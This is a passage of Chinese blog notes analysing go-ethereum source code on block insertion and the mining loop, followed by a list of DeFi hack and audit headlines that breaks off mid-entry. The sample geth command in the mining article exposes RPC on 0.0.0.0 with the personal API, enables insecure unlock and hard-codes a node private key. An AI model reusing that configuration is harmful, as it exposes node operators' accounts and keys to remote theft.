new(big.Int).Mul(new(big.Int).SetUint64(st.gasUsed()), st.gasPrice))\n回到ApplyTransaction\n1.5 调用IntermediateRoot计算状态trie的当前根哈希值。\n最终确定所有肮脏的存储状态，并把它们写进trie\ns.Finalise(deleteEmptyObjects)\n将trie根设置为当前的根哈希并将给定的object写入到trie中\nobj.updateRoot(s.db)\ns.updateStateObject(obj)\n1.6 创建收据\nreceipt := types.NewReceipt(root, failed, *usedGas)\n\treceipt.TxHash = tx.Hash()\n\treceipt.GasUsed = gas\n\tif msg.To() == nil {\n\t\treceipt.ContractAddress = crypto.CreateAddress(vmenv.Context.Origin, tx.Nonce())\n\t}\n\t// Set the receipt logs and create a bloom for filtering\n\treceipt.Logs = statedb.GetLogs(tx.Hash())\n\treceipt.Bloom = types.CreateBloom(types.Receipts{receipt})\n\treceipt.BlockHash = statedb.BlockHash()\n\treceipt.BlockNumber = header.Number\n\treceipt.TransactionIndex = uint(statedb.TxIndex())\n②：最后完成区块，应用任何共识引擎特定的额外功能(例如区块奖励)\np.engine.Finalize(p.bc, header, statedb, block.Transactions(), block.Uncles())\nfunc (ethash *Ethash) Finalize(chain consensus.ChainReader, header *types.Header, state *state.StateDB, txs []*types.Transaction, uncles []*types.Header) {\n\t// Accumulate any block and uncle rewards and commit the final state root\n\t//累积任何块和叔叔的奖励并提交最终状态树根\n\taccumulateRewards(chain.Config(), state, header, uncles)\n\theader.Root = state.IntermediateRoot(chain.Config().IsEIP158(header.Number))\n}\n到此为止bc.processor.Process执行完毕，返回receipts.\n\n校验状态\n大致包括4部分的校验：\n①：校验使用的gas是否相等\nif block.GasUsed() != usedGas {\n\t\treturn fmt.Errorf(&quot;invalid gas used (remote: %d local: %d)&quot;, block.GasUsed(), usedGas)\n\t}\n②：校验bloom是否相等\nrbloom := types.CreateBloom(receipts)\n\tif rbloom != header.Bloom {\n\t\treturn fmt.Errorf(&quot;invalid bloom (remote: %x  local: %x)&quot;, header.Bloom, rbloom)\n\t}\n③：校验收据哈希是否相等\nreceiptSha := types.DeriveSha(receipts)\n\tif receiptSha != header.ReceiptHash {\n\t\treturn fmt.Errorf(&quot;invalid receipt root hash (remote: %x local: %x)&quot;, header.ReceiptHash, receiptSha)\n\t}\n④：校验merkleroot 是否相等\nif root := statedb.IntermediateRoot(v.config.IsEIP158(header.Number)); header.Root != root {\n\t\treturn fmt.Errorf(&quot;invalid merkle root (remote: %x local: %x)&quot;, header.Root, root)\n\t}\n\n将块和关联状态写入到数据库\n函数：WriteBlockWithState\n①：计算块的total td\nptd := bc.GetTd(block.ParentHash(), block.NumberU64()-1)\n②：添加待插入块本身的td ,并将此时最新的total td 存储到数据库中。\nbc.hc.WriteTd(block.Hash(), block.NumberU64(), externTd)\n③：将块的header和body分别序列化到数据库\nrawdb.WriteBlock(bc.db, block)\n\t-&gt;WriteBody(db, block.Hash(), block.NumberU64(), block.Body())\n\t-&gt;WriteHeader(db, block.Header())\n④：将状态写入底层内存Trie数据库\nstate.Commit(bc.chainConfig.IsEIP158(block.Number()))\n⑤：遍历节点数据写入到磁盘\ntriedb.Commit(header.Root, true)\n⑥：存储一个块的所有交易数据\nrawdb.WriteReceipts(batch, block.Hash(), block.NumberU64(), receipts)\n⑦：将新的head块注入到当前链中\nif status == CanonStatTy {\n\t\tbc.insert(block)\n\t}\n\n存储分配给规范块的哈希\n存储头块的哈希\n存储最新的快\n更新currentFastBlock\n\n⑧：发送chainEvent事件或者ChainSideEvent事件或者ChainHeadEvent事件\nif status == CanonStatTy {\n\t\tbc.chainFeed.Send(ChainEvent{Block: block, Hash: block.Hash(), Logs: logs})\n\t\tif len(logs) &gt; 0 {\n\t\t\tbc.logsFeed.Send(logs)\n    }\n\t\tif emitHeadEvent {\n\t\t\tbc.chainHeadFeed.Send(ChainHeadEvent{Block: block})\n\t\t}\n\t} else {\n\t\tbc.chainSideFeed.Send(ChainSideEvent{Block: block})\n\t}\n到此writeBlockWithState 结束，从上面可以知道，insertChain的最终还是调用了writeBlockWithState的insert方法完成了最终的上链入库动作。\n最后整个insertChain 函数，如果已经完成了插入，就发送chain head事件\n\tdefer func() {\n\t\tif lastCanon != nil &amp;&amp; bc.CurrentBlock().Hash() == lastCanon.Hash() {\n\t\t\tbc.chainHeadFeed.Send(ChainHeadEvent{lastCanon})\n\t\t}\n\t}()\n比较常见的有这么几处会进行订阅chain head 事件：\n\n\n在tx_pool.go中，收到此事件会进行换head的操作\npool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)\n\n\n在worker.go中,其他节点的矿工收到此事件就会停止当前的挖矿，继续下一个挖矿任务\nworker.chainHeadSub = eth.BlockChain().SubscribeChainHeadEvent(worker.chainHeadCh)\n\n\n到此整个区块上链入库就完成了，最后再送上一张总结的图：\n\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之挖矿流程-8":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之挖矿流程-8","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之挖矿流程-8.md","title":"死磕以太坊源码分析之挖矿流程-8","links":[],"tags":[],"content":"\n死磕以太坊源码分析之挖矿流程\ngithub.com/blockchainGuide (文章资料在此，给个Star哦)\n\n基本架构\n以太坊挖矿的主要流程是由miner包负责的，下面是基本的一个架构：\n\n首先外部是通过miner对象进行了操作，miner里面则是实用worker对象来实现挖矿的整体功能。miner决定着是否停止挖矿或者是否可以开始挖矿，同时还可以设置矿工的地址来获取奖励。\n真正调度处理挖矿相关细节的则是在worker.go里面，我们先来看一张总体的图。\n\n上图我们看到有四个循环，分别通过几个channel负责不同的事：\nnewWorkLoop\n\nstartCh：接收startCh信号，开始挖矿\nchainHeadCh：表示接收到新区块，需要终止当前的挖矿工作，开始新的挖矿。\ntimer.C：默认每三秒检查一次是否有新交易需要处理。如果有则需要重新开始挖矿。以便将加高的交易优先打包到区块中。\n\n在 newWorkLoop 中还有一个辅助信号，resubmitAdjustCh 和 resubmitIntervalCh。运行外部修改timer计时器的时钟。resubmitAdjustCh是根据历史情况重新计算一个合理的间隔时间。而resubmitIntervalCh则允许外部，实时通过 Miner 实例方法 SetRecommitInterval 修改间隔时间。\nmainLoop\n\nnewWorkCh:接收生成新的挖矿任务信号\nchainSideCh:接收区块链中加入了一个新区块作为当前链头的旁支的信号\ntxsCh:接收交易池的Pending中新加入了交易事件的信号\n\nTaskLoop则是提交新的挖矿任务，而resultLoop则是成功出块之后做的一些处理。\n\n启动挖矿\n挖矿的参数设置\ngeth挖矿的参数设置定义在 cmd/utils/flags.go 文件中\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数默认值用途–minefalse是否开启自动挖矿–miner.threads0挖矿时可用并行PoW计算的协程（轻量级线程）数。 兼容过时参数 —minerthreads。–miner.notify空挖出新块时用于通知远程服务的任意数量的远程服务地址。 是用 ,分割的多个远程服务器地址。 如：”api.miner.com,api2.miner.com“–miner.noverifyfalse是否禁用区块的PoW工作量校验。–miner.gasprice1000000000 wei矿工可接受的交易Gas价格， 低于此GasPrice的交易将被拒绝写入交易池和不会被矿工打包到区块。–miner.gastarget8000000 gas动态计算新区块燃料上限（gaslimit）的下限值。 兼容过时参数 —targetgaslimit。–miner.gaslimit8000000 gas动态技术新区块燃料上限的上限值。–miner.etherbase第一个账户用于接收挖矿奖励的账户地址， 默认是本地钱包中的第一个账户地址。–miner.extradatageth版本号允许矿工自定义写入区块头的额外数据。–miner.recommit3s重新开始挖掘新区块的时间间隔。 将自动放弃进行中的挖矿后，重新开始一次新区块挖矿。\n常见的启动挖矿的方式\n参数设置挖矿\n\ndgeth —dev —mine\n\n控制台启动挖矿\n\nminer.start(1)\n\nrpc 启动挖矿\n这是部署节点使用的方式，一般设置如下：\n\n/geth —datadir “/data0” —nodekeyhex “27aa615f5fa5430845e4e99229def5f23e9525a20640cc49304f40f3b43824dc” —bootnodes $enodeid —mine —debug —metrics —syncmode=“full” —gcmode=archive —istanbul.blockperiod 5 —gasprice 0 —port 30303 —rpc —rpcaddr “0.0.0.0” —rpcport 8545 —rpcapi “db,eth,net,web3,personal” —nat any —allow-insecure-unlock\n\n\n开始源码分析，进入到miner.go的New函数中：\nfunc New(eth Backend, config *Config, chainConfig *params.ChainConfig, mux *event.TypeMux, engine consensus.Engine, isLocalBlock func(block *types.Block) bool) *Miner {\n\tminer := &amp;Miner{\n\t\t...\n\t}\n\tgo miner.update()\n\treturn miner\n}\nfunc (miner *Miner) update() {\n  switch ev.Data.(type) {\n\t\t\tcase downloader.StartEvent:\n\t\t\t\tatomic.StoreInt32(&amp;miner.canStart, 0)\n\t\t\t\tif miner.Mining() {\n\t\t\t\t\tminer.Stop()\n\t\t\t\t\tatomic.StoreInt32(&amp;miner.shouldStart, 1)\n\t\t\t\t\tlog.Info(&quot;Mining aborted due to sync&quot;)\n\t\t\t\t}\n\t\t\tcase downloader.DoneEvent, downloader.FailedEvent:\n\t\t\t\tshouldStart := atomic.LoadInt32(&amp;miner.shouldStart) == 1\n \n\t\t\t\tatomic.StoreInt32(&amp;miner.canStart, 1)\n\t\t\t\tatomic.StoreInt32(&amp;miner.shouldStart, 0)\n\t\t\t\tif shouldStart {\n\t\t\t\t\tminer.Start(miner.coinbase)\n\t\t\t\t}\n}\n一开始我们初始化的canStart=1 ， 如果Downloader模块正在同步，则canStart=0,并且停止挖矿，如果Downloader模块Done或者Failed，则canStart=1,且同时shouldStart=0,miner将启动。\nminer.Start(miner.coinbase)\n \nfunc (miner *Miner) Start(coinbase common.Address) {\n...\n\tminer.worker.start()\n}\nfunc (w *worker) start() {\n...\n\tw.startCh &lt;- struct{}{}\n}\n接下来将会进入到mainLoop中去处理startCh：\n①：清除过旧的挖矿任务\nclearPending(w.chain.CurrentBlock().NumberU64())\n②：提交新的挖矿任务\ncommit := func(noempty bool, s int32) {\n...\n\t\tw.newWorkCh &lt;- &amp;newWorkReq{interrupt: interrupt, noempty: noempty, timestamp: timestamp}\n...\n\t}\n生成新的挖矿任务\n根据newWorkCh生成新的挖矿任务，进入到CommitNewWork中：\n①：组装header\nheader := &amp;types.Header{ //组装header\n\t\tParentHash: parent.Hash(),\n\t\tNumber:     num.Add(num, common.Big1), //num+1\n\t\tGasLimit:   core.CalcGasLimit(parent, w.config.GasFloor, w.config.GasCeil),\n\t\tExtra:      w.extra,\n\t\tTime:       uint64(timestamp),\n\t}\n②：根据共识引擎吃初始化header的共识字段\nw.engine.Prepare(w.chain, header); \n③：为当前挖矿新任务创建环境\n w.makeCurrent(parent, header)\n④：添加叔块\n叔块集分本地矿工打包区块和其他挖矿打包的区块。优先选择自己挖出的区块。选择时，将先删除太旧的区块，只从最近的7(staleThreshold)个高度中选择，最多选择两个叔块放入新区块中.在真正添加叔块的同时会进行校验，包括如下：\n\n叔块存在报错\n添加的uncle是父块的兄弟报错\n叔块的父块未知报错\n\ncommitUncles(w.localUncles)\ncommitUncles(w.remoteUncles)\n⑤：如果noempty为false，则提交空块，不填充交易进入到区块中,表示提前挖矿\nif !noempty {\n  w.commit(uncles, nil, false, tstart)\n}\n⑥：填充交易到新区块中\n6.1 从交易池中获取交易，并把交易分为本地交易和远程交易，本地交易优先，先将本地交易提交，再将外部交易提交。\nlocalTxs, remoteTxs := make(map[common.Address]types.Transactions), pending\n\tfor _, account := range w.eth.TxPool().Locals() {\n\t\tif txs := remoteTxs[account]; len(txs) &gt; 0 {\n\t\t\tdelete(remoteTxs, account)\n\t\t\tlocalTxs[account] = txs\n\t\t}\n\t}\nif len(localTxs) &gt; 0 {\n   txs := types.NewTransactionsByPriceAndNonce(w.current.signer, localTxs)\n   if w.commitTransactions(txs, w.coinbase, interrupt) {\n      return\n   }\n}\nif len(remoteTxs) &gt; 0 {\n   ...\n}\n6.2提交交易\n\n首先校验有没有可用的Gas\n如果碰到以下情况要进行交易执行的中断\n\n新的头块事件到达，中断信号为 1     (整个任务会被丢弃)\nworker 开启或者重启，中断信号为 1     （整个任务会被丢弃）\nworker重新创建挖矿任务根据新的交易，中断信号为 2 （任务还是会被送入到共识引擎）\n\n\n\n6.3开始执行交易\nlogs, err := w.commitTransaction(tx, coinbase)\n6.4执行交易获取收据\nreceipt, err := core.ApplyTransaction(w.chainConfig, w.chain, &amp;coinbase, w.current.gasPool, w.current.state, w.current.header, tx, &amp;w.current.header.GasUsed, *w.chain.GetVMConfig())\n如果执行出错，直接回退上一个快照\nif err != nil {\n\t\tw.current.state.RevertToSnapshot(snap)\n\t\treturn nil, err\n\t}\n出错的原因大概有以下几个：\n\n超出当前块的gas limit\nNonce 太低\nNonce 太高\n\n执行成功的话讲交易和收据存入到w.current中。\n⑦：执行交易的状态更改，并组装成最终块\nw.commit(uncles, w.fullTaskHook, true, tstart)\n执行交易的状态更改，并组装成最终块是由下面的共识引擎所完成的事情：\nblock, err := w.engine.FinalizeAndAssemble(w.chain, w.current.header, s, w.current.txs, uncles, w.current.receipts)\n底层会调用 state.IntermediateRoot执行状态更改。组装成最终块意味着到这打包任务完成。接着就是要提交新的挖矿任务。\n\n提交新的挖矿任务\n①：获取sealHash（挖矿前的区块哈希），重复提交则跳过\nsealHash := w.engine.SealHash(task.block.Header()) // 返回挖矿前的块的哈希\n\t\t\tif sealHash == prev {\n\t\t\t\tcontinue\n\t\t\t}\n②:生成新的挖矿请求，结果返回到reultCh或者StopCh中\nw.engine.Seal(w.chain, task.block, w.resultCh, stopCh);\n挖矿的结果会返回到resultCh中或者stopCh中，resultCh有数据成功出块，stopCh不为空，则中断挖矿线程。\n\n成功出块\nresultCh有区块数据，则成功挖出了块，到最后的成功出块我们还需要进行相应的验证判断。\n①：块为空或者链上已经有块或者pendingTasks不存在相关的sealhash,跳过处理\nif block == nil {}\nif w.chain.HasBlock(block.Hash(), block.NumberU64()) {}\ntask, exist := w.pendingTasks[sealhash] if !exist {}\n②：更新receipts\nfor i, receipt := range task.receipts {\n  receipt.BlockHash = hash\n  ...\n}\n③：提交块和状态到数据库\n_, err := w.chain.WriteBlockWithState(block, receipts, logs, task.state, true) // 互斥\n④：广播区块并宣布链插入事件\nw.mux.Post(core.NewMinedBlockEvent{Block: block})\n⑤：等待规范确认本地挖出的块\n新区块并非立即稳定，暂时存入到未确认区块集中。\nw.unconfirmed.Insert(block.NumberU64(), block.Hash())\n\n总结&amp;参考\n整个挖矿流程还是比较的简单，通过 4 个Loop互相工作，从开启挖矿到生成新的挖矿任务到提交新的挖矿任务到最后的成功出块，这里面的共识处理细节不会提到，接下来的文章会说到。\n\nmindcarver.cn\ngithub.com/blockchainGuide\nlearnblockchain.cn/books/geth/part2/mine/design.html\nyangzhe.me/2019/02/25/ethereum-miner/#%E5%8A%A8%E6%80%81%E8%B0%83%E6%95%B4%E5%87%BA%E5%9D%97%E9%A2%91%E7%8E%8\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/安全性":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/安全性","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/安全性.md","title":"安全性","links":[],"tags":[],"content":"\n\nHarvest 被闪电贷攻击导致价格脱锚，被黑 1800 万美元\n\n\n拿攻击做广告：MakerDAO 治理程序被 B 协议使用闪电贷 “友好攻击”\n\n\nTrail of Bits 发现了 Diamond 实现中的问题。 Nick Mudgen 的回应\n\n\nNansen 分析了巨鲸集中的 SushiSwap 流动性挖矿活动，并发现了一个利用点\n\n\n根据 Echidna 教程来模糊测试你的 Solidity 代码\n\n\nPercentFinance 的 bug 冻结了用户的余额\n\n\nAxion 上线之后立即被黑。CertiK 称恶意代码是在审计之后加入的\n\n\n三明治攻击：又堵截（frontrunning）又围追（backrunning）你的 uniswap 交易，以绕开滑点容忍\n\n\nSamczsun： 如何使用价格信息输入机制\n\n\nPerez, Livshits 论文： “有漏洞” 的以太坊代码并不意味着已经被爆破过\n\n\nSlither v0.6.14：提高了对 Solidity v0.7 的支持，与 Hardhat 协同工作\n\n\nCertora 发现了 ABI 编码器 bug\n\n\nAkropolis 可重入漏洞导致被盗 200 万美元 Dai\n\n\nValueDefi（此前的 yfv）推特声称具备 “最高安全性”，几个小时后遭遇信息输入机制攻击，损失 740 万美元\n\n\n所有 Damn Vulnerable DeFi 挑战赛的答案及解释\n\n\n更多 Damn Vulnerable DeFi 挑战赛解读，来自 Peter Kacherginsky\n\n\n来自 88mph 的安全漏洞事后报告；该漏洞使得他们被盗 10 万美元，但也使得他们能通过 Taichi 网络的隐私交易功能取回被盗的资金\n\n\nTrail of Bits 的 Josselin Feist 在 Aave v1 和 v2 中发现了一个未被初始化的代理，可能导致自毁\n\n\nhevm 中带有 ds-test 的符号执行教程\n\n\nImmunefi：以太坊 bug 悬赏列表\n\n\nSlither v0.7：加入了 26 种漏洞的探测器，包括可以捕捉到上周 Aave bug 的探测器。还支持 Solidity top level objects\n\n\nNeat：在 Hardhat 仓库中复盘 Aave 漏洞\n\n\nWarp Finance（在被黑之前我从来没听过这个项目）被黑 680 万 DAI/USDC（外加 1400 ETH），攻击手法是通过在 Uniswap 上交易 2 亿美元、在 dydx 上交易 5000 万美元来使 WETH 的价格脱锚。Warp 成功拿回了约 7.5% 的 DAI/USDC\n\n\nDefiSaver 被 Dedaub 的自动化静态分析发现了漏洞，白帽子抢救出了 350 万美元\n\n\nRug Pull 游戏：不安全的随机数遭到爆破\n\n\nEthGlobal 的 DeFi 安全圆桌视频\n\n\nMaurelian 在 Sandbox 中发现了一个批量转账漏洞\n\n\nLivepeer 发现了一个安全漏洞\n\n\nSecureum：如何阅读审计\n\n\nTyphoon.cash 漏洞\n\n\nSecureum 分析 Hermez 的审计结果\n\n\nyearn 被黑：攻击者通过闪电贷干扰预言机，窃走 1100 万 DAI，yearn 在过程中切断了攻击，保住了约 70% 的 DAI。一些安全防护已经降低，以鼓励用户迁移到 v2。本次攻击的一份详细解析\n\n\nyearn 的克隆产品 BT 遭遇与上周的 yearn 攻击相同的攻击，损失 150 万美元\n\n\nAlphaHomora 在一系列复杂的交易中被黑 3800 万美元，如果你搞不懂发生了啥，可以看 Bartek Kiepuszewski 的解释\n\n\n依赖库混乱：对 BigTech 的供应链攻击；使用 MetaMask 的 Lavamoat 工具来沙盒化你的依赖库\n\n\n一份以太坊应用代码安全性检查清单\n\n\nCryptopunks 因缺乏前端保护而遭遇抢跑\n\n\nsamczun 发现了 ForTube 的漏洞 ：验证逻辑可以被绕过\n\n\nGithub：请注意 npm 假冒攻击\n\n\n使用 Metamask 的 Lavamoat 避免 npm 攻击\n\n\n找出恶意的 go 安装包\n\n\nSNARKy 仪式的安全框架\n\n\n通过操纵价格和大量调用来强制农民接受糟糕的价格\n\n\nSamczsun 和 Tina Zhen 从 ElasticDAO 中救出了 450 万美元\n\n\n通过操纵价格和大量调用来强制农民接受糟糕的价格\n\n\nSamczsun 和 Tina Zhen 从 ElasticDAO 中救出了 450 万美元\n\n\n新的 Ethernaut 层级\n\n\nMakerDAO 发布了 ESM 和 End 模块漏洞的补丁\n\n\nPancake v2 bug（是在 BSC 链上的，不过是用 SOlidity 语言写的）\n\n\nSamczsun: 揭开尘封四年的 EToken2 bug\n\n\n使用 Stakehound 质押的 3.8 万 ETH 因为部分取款密钥丢失而不可再访问\n\n\nSharedStake 声称有 50 万美元有内部时间锁漏洞\n\n\nZapper Polygon 桥事件事后报告\n\n\nAnyswap V3 桥合约遭爆破：约 800 万美元被盗，两笔使用同一个 R 值得交易让黑客可以推导出私钥\n\n\nChainSwap 桥带有逻辑错误：未经授权的地址可以提高配额\n\n\nThorchain 桥遭爆破：约 500 万美元被盗，攻击者的封装器合约使用发送 ETH 的交易存入 0 价值\n\n\nThorchain 遭爆破丢失约 800 万美元；调用恶意合约可以吸干持有者的 RUNE\n\n\n使用一个蜜罐来探究 Twitter 回复诈骗\n\n\n想成为一个审计员？Secureum 夏令营延长了申请日期（这是免费的）\n\n\nsamczsun 探讨了 SushiSwap 的 Miso 漏洞：在一个循环中通过 delegatecall 使用 msg.value 导致 3.5 亿美金处在危险之中；形式化验证未能发现 bug 因为其形式化规范漏写了一条规则\n\n\nPolygon 拒绝服务式漏洞 公开，未初始化的逻辑合约可以自毁\n\n\nCream Finance 遭爆破，损失 4.62 亿 AMP 和 2800 ETH，是因为 ERC777 的可重入问题\n\n\nxToken 遭爆破，损失 450 万美元，不正确的请求声明使得函数变成了公开可调用的\n\n\nOpenZeppelin Contracts 时间锁控制器漏洞事后报告\n\n\nOpenZeppelin UUPS 代理合约安全咨询\n\n\nOpenSea ERC721 转移到 ENS 的 bug 在同一天引入并修复，导致第一个注册的 ENS 域名的所有权被销毁\n\n\ndYdX 安全模块升级出错，存储项的布局在新的实现合约中改变了\n\n\nCompound bug 放出了超多的 COMP 奖励，上限在 28 万 COMP（市场价值约 8300 万）\n\n\nDeversiFi 使用硬件钱包发送交易，误发了 7676 ETH 的 gas 费，原因补充 JavaScript 库用十进制而 Ledger 硬件钱包用十六进制处理手续费；后来资金得到返还，手续费是 50 ETH\n\n\n有风险的 COMP 增加到约 49 万个，drip 函数已经发送了积压的约 20 万 COMP给审计器，社区一直在归还 COMP\n\n\nStaking pool 的漏洞影响了 Lido 和 Rocket Pool，存款交易可以被抢跑，使得用户资金处在风险之中。由 StakeWise 公开；2019 年末在 Eth Research 论坛上已有讨论\n\n\nPolygon Plasma 桥的多重支付漏洞\n\n支付了 200 万美元的奖金\n退出交易可以重发 223 次\n8.5 亿美元处在风险之中\n\n\n\nGelato G-UNI 路由器漏洞，2600万美元安全，没有资金损失，Samczsun 发出警报，撤销了给予有漏洞的合约的批准。\n\n\nUmbra 前端漏洞泄露, 没有资金损失或者风险，确认账户配置正确\n\n\nNFT 持有者钓鱼，空投索赔签署使用硬件钱包实际上是在 OpenSea 私下销售两个 NFT\n\n\n对阀值 ECDSA 实施进行密钥提取攻击，50万美元赏金\n\n\nPLONK ZKP C++ 使用零点攻击来创建一个验证者接受的伪造证明，15000美元赏金\n\n\n下一个 Secureum 训练营，学习成为一名审计师，1月开始。\n\n\nBent Finance~175万美元损失，报告称流氓开发者通过给开拓者账户硬编码余额升级合约\n\n\nVisor Finance 880万美元VISR损失，质押合约全部损失，攻击合约成为了所有者\n\n\nSorbet Finance 漏洞事后分析，合约允许任意低级别的调用，2700万美元的用户基金被救出，7.44万美元被盗\n\n\nAdidas token 空投上限为每个地址2个NFT，定制合约已经购买了330个NFT，165个子合约每个合约已申领2个NFT\n\n\nNotional 漏洞揭露，攻击者可以在没有足够资金的情况下借款，功能已禁用，没有资金损失，100万美元奖金\n\n\nIlluvium质押合约中的漏洞，铸造已暂停，没有资金损失。\n\n\nYEAR 空投 token 30ETH rugpull，通过改变所有者组织交易，交易池被耗尽\n\n\nSAILFISH系统可发现状态不一致bug，评估合约中的可重入性和交易顺序依赖性的检测\n\n\nAustin Williams的针对有趣的或者重要的项目的非正式安全抽查\n\n\nStobox STBU 部署者私钥泄露, 储备资金被盗\n\n\nGovernorBravo 兼容层的 OpenZeppelin Contracts 安全公告，由于 ABI 编码错误，执行函数调用的提案可能会出现错误的参数\n\n\n多链桥漏洞,600 ETH损失，请撤销批准。\n\n\nFloat Protocol 约$100万美金损失, Uniswap V3 价格预言机被操控\n\n\n修改 token 漏洞, 约300万美金面临风险，资金获救\n\n\nNotional Finance 事后分析, 逻辑错误导致漏测\n\n\nAustin Williams: MasterChefV2 本金冻结和赎金攻击\n\n\nSecureum 合约审计下次训练营\n\n\nOpenSea 没有取消那些过去经常以低于市场利率购买的 NFT 列表 ，该列表会一直有效直到交易取消，取消交易正在抢跑\n\n\nMultichain桥事后分析, 依赖 token 的 permit函数回退，但是 WETH 没有permit函数并且fallback函数没有回退。\n\n\nQubit Ethereum BSC Bridge 8千万美元漏洞, 检查不到位导致允许在 BSC 可以用有恶意数据以 0 ETH存储取款\n\n\nZORA 固定价格销售漏洞, 卖家可以提高价格并且可以提前购买，没有资金损失，已通过显示购买价格修复漏洞\n\n\nAustin Williams: BoringSolidity 的两个合约 一起导入时会让 ETH 耗尽；安全的合约组合起来时可能变得不安全\n\n\nWormhole 的 Solana/Ethereum 桥 约3亿美元被盗, 攻击者输入不正确的验证后骗过了签名，在 Solana 上铸造了 120k Wormhole ETH，93k ETH 桥接回以太坊\n\n\nQubit 桥事后分析, 审计后修改代码，额外的缓解措施或可减轻损失\n\n\nIndex Coop Rari 池失败的攻击, Uniswap V3 TWAP 预言机操作被 arb 机器人阻止, 攻击者损失 68ETH\n\n\n智能合约漏洞列表\n\n\nOptimism 的 Geth 分叉严重漏洞揭露： 重复触发 SELFDESTRUCT 持有 ETH 余额的合约上的操作码，可创建 ETH。没有资金损失，已修复并已测试并部署到 Optimism 的 Kovan 和 Mainnet 网络（包括所有基础设施提供商），saurik 获200万美元奖金\nDego Finance 漏洞导致1000万美元 被利用, 报道称私钥泄露\nTecra 63.9万美元损失, token 烧毁逻辑错误，Uniswap v2 池耗尽\nYearn 漏洞揭露, SingleSidedBalancer 策略可能被攻击, 悬赏20万美元\n\n\nRigoBlock 被利用, Dragos 中除 ETH 和 USDT 之外的所有token都处于风险之中\n\n\nEchidna v2.0.0 (fuzzer): 发现Solidity v0.8中的断言失败和整数溢出/下溢, 合约销毁检测，发现最大值\n\n\nUniswap 预言机攻击模拟器: 在v3 TWAP价格预言机上量化风险\n\n\nAustin Williams: Chainlink VRF 运营商可以尝试有利结果\n\n\n当EOA授予的多个ERC20批准时，可以被检测到Ice phishing\n\n\nPolygon PoS 共识绕过漏洞, required open validator spot with high capital costs, $75k bounty paid 攻击漏洞需要一个验证者的位置是开放的，并且需要巨额资本，赏金75,000 美元\n\n\nHarry Denley: 恶意 tokens can abuse events for display on block explorers 恶意token会污染事件，在区块浏览器上显示token来源的误导信息。\n\n\n针对OpenSea用户的NFT钓鱼攻击\n\n\nTreasure NFT 市场漏洞被利用,由于缺少非零数量的检查，上架的NFT被免费购买\n\n\nSherlock CTF 有漏洞的合约exploitable contracts: 由32个参与者构建\n\n\nBacon 协议100万美元 重入漏洞, 补丁中发现bug\n\n\nIdols Marketplace 漏洞, 挽救了约 58 个处于危险中的 ETH 和 NFT, 来自 samczsun 的报告\n\n\n执行层和共识层客户端的 EF 漏洞披露\n\n\nOptimism 自毁通胀事后分析\n\n\nUmbrella Network 约70万美元以太坊和BNB漏洞利用, 取款函数没有检查下溢\n\n\nLI.FI 月60万美元漏洞利用, swap 函数被用于转移已批准的代币\n\n\nCompound-TUSD 集成问题回顾, 数以百万用户处于风险中，TUSD 的“双合约”导致了一个双重入口点，其他DeFi协议可能受到影响，TUSD已修复\n\n\nENS 价格预言机部署问题回顾, 如果投票通过，过期域可以免费注册\n\n\nRonin 桥 6 亿美元的漏洞利用，9 个密钥中有 5 个泄露，据报道是社会工程攻击，6 天未发现；开尔文的解释\n\n\nRevest 协议约 200 万美元的漏洞利用、ERC1155 铸币重入、协议软锁定、暂停交易挽救了 100 万美元的损失\n\n\nGearBox 协议漏洞披露，路径解析器给出不同结果，约 1000 万美元处于风险之中，已修复，支付了 15 万美元赏金\n\n\nRari Capital：Fuse 池漏洞披露，跨资产重入允许免费借资产，通过升级修复\n\n\n安全事件作战室指南：记录、测试、改进、重复\n\n\nInverse Finance 1560 万美元漏洞利用，由于 TWAP 短窗口导致价格预言机操纵\n\n\nMetis Andromeda Layer 2 上的 Starstream 漏洞利用，public 执行函数允许 Stars 耗尽金库中的代币\n\n\nConvex Finance 漏洞披露，多签所有者可能获得质押 LP 代币的控制权，150 亿美元处于风险之中，已修复\n\n\nBeanstalk 7600 万美元的利用，用于执行恶意治理提案的闪电贷款，耗尽了流动资金池\n\n\nAkutar NFT 3400 万美元锁在了合约里，由于逻辑错误和荷兰拍卖退款最初被合约投标阻止，团队资金无法提取\n\n\nRari 的 Fuse pool #45 Uniswap v3 预言机操作漏洞，由于流动性低，400 万美元面临风险\n\n\n审查EIP4337 帐户抽象规范和参考实现，发现了一个关键的和几个严重的问题\n\n\n由于 exitMarket 函数中缺少重入检查，Rari 的 Fuse 池在主网和 Arbitrum 上 8000 万美元的漏洞利用\n\n\nSaddle Finance 因旧版本库 1020 万美元漏洞利用，397 万美元被 BlockSec 救出\n\n\nNEAR 彩虹桥攻击失败，watchdog 检测到攻击并创建了一个挑战交易\n\n\nAave v3 价格预言机操作漏洞，后备预言机缺少对设定资产价格的访问控制，第 2 层的 29 亿美元处于危险之中\n\n\nMulti-block MEV: 合并后 TWAP 预言机操作的可能性\n\n\nChainlink 为 LUNA/USD 触发了最低价格断路，最新更新价格为0.107美元，Blizz Finance (Avalanche)：还没来得及暂停协议就已耗尽了。\n\n\nBalancer Denial of Service (DoS) 漏洞披露，涉及双切入点(double entry-point) ERC20 代币,用户资金没有风险\n\n\nMEV bot 8 ETH 被利用\n\n\n2000万美元 OP 在 Optimism 上转移到 Wintermute，但做市商尚未部署多重签名。Hacker 卖出 100 万个 OP，返还 1800 万个 OP；1inch 的 Anton Bukov部署了 22,000多个 Gnosis Safes，并拥有 Optimism multisig的所有权\n\n\nAurora DELEGATECALL漏洞揭露,2 亿美元面临风险，已支付 600 万美元赏金\n\n\nOpenSea Wyvern漏洞披露,悬赏 300 万美元\n\n\nSense 预言机操作漏洞披露, 悬赏5万美元\n\n\nInverse Finance 580万美元的预言机价格操纵, 攻击被arb bot 